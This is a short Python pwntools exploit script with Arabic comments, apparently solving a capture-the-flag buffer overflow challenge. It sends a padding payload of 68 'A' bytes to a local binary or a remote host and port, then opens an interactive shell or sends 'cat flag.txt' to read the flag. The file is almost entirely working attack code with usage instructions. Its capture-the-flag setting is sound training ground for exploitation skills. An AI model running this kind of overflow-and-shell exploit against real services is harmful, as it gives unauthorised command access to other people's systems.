from pwn import *
context.log_level = 'error'                                          # ; اخفاء رسائل السجلات  ( disable logs messages )

# Payload 
PAYLOAD = b"A" * (60 + 8)

# local exploit
def local__ex(file: string):
   p = process(file)                                                 # ; . انشاء عمليه وربطها بموصل لتواصل مع العمليه
   p.recv()                                                          # ; . استقبال البيانات
   p.sendline(PAYLOAD)                                               # ; . ارسال بيانات بسطر واحد
   p.interactive()                                                   # ; 

# remote exploit 
def remote_ex(host_port: string, get_flag: bool):
   HOST, PORT = host_port.split(":")                                 # ; 
   p = remote(HOST, int(PORT))                                       # ; انشاء عملية تحكم عن بعد عنطريق : (العنوان و المنفذ)
   p.recv()                                                          # ;              
   p.sendline(PAYLOAD)                                               # ; 
   if get_flag:                                                      # ; 
     p.recvuntil(b"Thanks, Here's a small gift for you <3\n")        # ; استقبال البينات لحتى وصل الجملة المحدده .
     p.sendline(b"cat flag.txt")                                     # ; 
     print("Flag: " + p.recv().decode("UTF-8"))                      # ; 
   else: p.interactive()                                             # ; 

def main():
   import sys
   try:
      
      content: string = sys.argv[2]
      get_flag: bool  = True if "-flag" in sys.argv else False 
      
      if sys.argv[1] == "-r": remote_ex(content, get_flag)
      if sys.argv[1] == "-l": local__ex(content)

   except:
      print("python exploit.py -l file.out        : for locally  exploit")
      print("python exploit.py -r HOST:PORT       : for remotely exploit!")
      print("python exploit.py -r HOST:PORT -flag : for get-flag automatically")

if __name__ == '__main__':
   main()
